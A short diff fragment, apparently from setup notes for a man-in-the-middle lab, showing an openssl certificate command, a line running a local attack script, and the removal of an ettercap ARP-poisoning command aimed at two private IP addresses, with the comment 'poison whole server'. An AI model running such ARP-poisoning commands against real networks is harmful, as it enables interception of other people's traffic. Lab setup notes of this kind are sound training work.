@@ -26,8 +26,6 @@ sudo openssl req -new -x509 \
 
 Attack
 sudo python3 /opt/tools/attack.py
-sudo ettercap -T -i eth0 -M arp:remote /192.168.50.20/ /192.168.50.40/
-poison whole server
 
 
 server {
